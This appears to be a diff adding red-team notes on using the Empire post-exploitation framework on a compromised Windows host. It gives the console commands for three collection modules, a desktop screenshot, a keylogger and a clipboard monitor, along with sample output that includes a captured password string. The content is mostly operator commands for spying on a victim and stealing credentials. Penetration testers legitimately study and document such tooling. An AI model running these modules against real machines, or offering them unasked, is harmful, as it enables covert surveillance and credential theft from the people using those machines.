@@ -1,0 +1,26 @@
+Empire - Collecting Screenshots, Keylogger and stealing clipboard
+
++ Module that take a screenshot of the victim's desktop
+
+	# (Empire: Baseline) > usemodule collection/screenshot
+	# (Empire: powershell/collection/screenshot) > execute
+		Output saved to ./downloads/Baseline/screenshot/IEWIN7_2019-09-21_15-39-28.png
+
++ Module that capturing victim's keystrokes to a file
+
+	# (Empire: Baseline) > usemodule collection/keylogger
+	# (Empire: powershell/collection/keylogger) > execute
+	
++ Module that grab victim's clipboard which is useful for grabbing copied data and password
+
+	# (Empire) > interact NPGXUBKL
+	# (Empire: NPGXUBKL) > usemodule collection/clipboard_monitor
+	# (Empire: powershell/collection/clipboard_monitor) > execute
+	# (Empire: powershell/collection/clipboard_monitor) > 
+		Job started: UVGNRC
+
+		=== Get-ClipboardContents Starting at 22/09/2019:00:53:43:21 ===
+		
+		=== 22/09/2019:00:54:10:70 ===
+		
+		hello, this is my password
